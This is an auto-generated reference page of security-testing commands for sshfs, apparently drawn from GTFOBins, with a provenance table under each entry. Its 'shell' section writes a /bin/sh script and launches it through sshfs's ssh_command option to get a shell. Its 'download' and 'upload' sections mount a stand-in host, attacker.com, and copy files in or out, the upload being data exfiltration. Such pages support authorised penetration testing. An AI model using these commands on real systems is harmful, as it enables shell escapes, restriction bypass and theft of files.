---
parsed_by: focuslocust
source: commands
type: generated
---
# sshfs Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## sshfs

Tool page: [sshfs](../../tools/linux/sshfs.md)

### command

```text
sshfs -o ssh_command=/path/to/command x: /path/to/dir/
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshfs` |
| Evidence | Function example preserved from source parser. |

### download

```text
sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/dir/path/to/input-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshfs` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshfs` |
| Evidence | Function example preserved from source parser. |

### upload

```text
sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/input-file /path/to/dir/
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshfs` |
| Evidence | Function example preserved from source parser. |
